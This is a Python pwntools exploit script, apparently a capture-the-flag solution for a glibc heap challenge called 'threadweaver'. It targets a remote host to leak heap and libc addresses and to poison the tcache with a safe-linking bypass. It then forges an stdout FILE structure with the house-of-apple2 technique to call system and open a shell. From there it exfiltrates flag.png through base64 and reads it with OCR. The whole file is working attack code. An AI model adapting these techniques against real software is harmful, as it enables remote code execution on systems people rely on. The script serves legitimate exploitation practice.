from pwn import *
from pwncli import io_file
import pytesseract
from PIL import Image
import re


# using the patched binary with pwninit
elf = ELF("threadweaver_patched")
libc = elf.libc
p = remote("154.57.164.67", 30353)
context.arch = "amd64"

# step 1 , heap leak
info("Heap Leak")
p.sendlineafter(b">", b"1")
p.sendlineafter(b"Size", b"256")

p.sendlineafter(b">", b"1")
p.sendlineafter(b"Size", b"256")

p.sendlineafter(b">", b"1")
p.sendlineafter(b"Size", b"256")

p.sendlineafter(b">", b"4")
p.sendlineafter(b"Index", b"0")

p.sendlineafter(b">", b"5")
p.sendlineafter(b"Index", b"0")

p.sendlineafter(b">", b"3")
p.sendlineafter(b"Index", b"0")


heap_leak = p.recvuntil(b"Exit")
heap_leak = heap_leak[heap_leak.index(b"\x0a") :]
heap_leak = heap_leak[1:]
heap_leak = heap_leak[:8]
heap_leak = u64(heap_leak)
xor_leak = heap_leak
heap_leak = heap_leak << 12
chunk0 = heap_leak + 0x330
heap_base = heap_leak - 0x1000
info("Heap base 0x%x", heap_base)


# Step 2, unsorted bin
info("LibC Leak")
p.sendlineafter(b">", b"4")
p.sendlineafter(b"Index", b"1")

for i in range(6):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"Index", b"0")
    p.sendlineafter(b"Length", b"17")
    payload = p64(0) + p64(0)
    p.sendlineafter(b"Data", payload)
    p.sendlineafter(b">", b"5")
    p.sendlineafter(b"Index", b"0")
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b"Index", b"0")

# because free happens in other thread,
p.sendlineafter(b">", b"2")
p.sendlineafter(b"Index", b"0")
p.sendlineafter(b"Length", b"17")
payload = p64(0) + p64(0)
p.sendlineafter(b"Data", payload)

p.sendlineafter(b">", b"5")
p.sendlineafter(b"Index", b"0")

p.sendlineafter(b">", b"3")

p.sendlineafter(b"Index", b"0")
heap_leak = p.recvuntil(b"Exit")
heap_leak = heap_leak[heap_leak.index(b"\x0a") :]
heap_leak = heap_leak[1:]
libc.address = u64(heap_leak[:8]) - 0x203B20
elf.address = libc.address + 0x214000
info("LibC Addr 0x%x", libc.address)
info("PIE Address 0x%x", elf.address)


info("Tcachebin Dup")

info("Setting chunk to bss")
payload = p64(elf.bss() + 0x120 - 0xA0 ^ ((chunk0 + 0x100) >> 12))
p.sendlineafter(b">", b"2")
p.sendlineafter(b"Index", b"1")
p.sendlineafter(b"Length", b"9")
p.sendlineafter(b"Data", payload)

p.sendlineafter(b">", b"1")
p.sendlineafter(b"Size", b"256")

p.sendlineafter(b">", b"1")
p.sendlineafter(b"Size", b"256")

p.sendlineafter(b">", b"1")
p.sendlineafter(b"Size", b"256")

info("Overwritting bss with our pointer")
payload = b"\x00" * 0xA0
payload += p64(libc.sym["_IO_2_1_stdout_"]) + p64(0x100) + p32(1) + p32(1)
p.sendlineafter(b">", b"2")
p.sendlineafter(b"Index", b"4")
p.sendlineafter(b"Length", b"184")
p.sendlineafter(b"Data", payload)


file = io_file.IO_FILE_plus_struct()
payload = file.house_of_apple2_execmd_when_do_IO_operation(
    libc.sym["_IO_2_1_stdout_"], libc.sym["_IO_wfile_jumps"], libc.sym["system"]
)
p.sendlineafter(b">", b"2")
p.sendlineafter(b"Index", b"0")
p.sendlineafter(b"Length", b"224")
p.sendlineafter(b"Data", payload)

info("Shell (Press Ctrl-C to exit and get flag png)")
p.interactive()
# after shell for remote
sleep(1)
marker = b"__B64_END__"

p.sendline(b"base64 -w 0 ./flag.png; echo; echo " + marker)

data = p.recvuntil(marker, drop=True)
data = data.strip()
flag = base64.b64decode(data)

with open("flag.png", "wb") as f:
    f.write(flag)

text = pytesseract.image_to_string(Image.open("flag.png"))
match = re.search(r"HTB\{[^}]+\}", text)

if match:
    print(match.group(0))
else:
    print("OCR output:")
    print(repr(text))

log.success(f"Downloaded flag.png")
